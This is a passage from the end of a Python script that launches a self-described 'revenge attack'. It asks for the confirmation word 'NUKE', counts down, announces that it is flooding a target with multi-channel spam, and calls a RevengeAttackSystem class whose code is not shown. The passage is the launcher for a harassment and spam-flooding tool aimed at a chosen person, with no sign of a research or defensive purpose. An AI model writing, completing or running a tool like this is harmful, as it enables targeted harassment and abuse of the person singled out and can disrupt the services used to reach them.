    if final != "NUKE":
        print("[ABORT] Attack cancelled.")
        return
    
    # Countdown
    print("\n[COUNTDOWN] Launching revenge attack...")
    for i in range(5, 0, -1):
        print(f"[{i}] Launching in {i}...")
        time.sleep(1)
    
    print("\n[LAUNCH] REVENGE ATTACK INITIATED!")
    print("[STATUS] Flooding target with multi-channel spam...")
    
    # Import base64 untuk API calls
    import base64
    
    # Start attack
    attack_system = RevengeAttackSystem(target)
    attack_system.start_full_attack()

if __name__ == "__main__":
    try:
        # Check requirements
        try:
            import base64
        except:
            print("[ERROR] Missing base64 module")
            sys.exit(1)
        
        # Check internet
        try:
            requests.get("https://google.com", timeout=5)
        except:
            print("[ERROR] No internet connection!")
            sys.exit(1)
        
        main()
    except KeyboardInterrupt:
        print("\n\n[ABORT] Attack cancelled by user.")
    except Exception as e:
        print(f"\n[ERROR] System failure: {e}")
        print("[INFO] Run as administrator for best results.")
    
    input("\nPress Enter to exit...")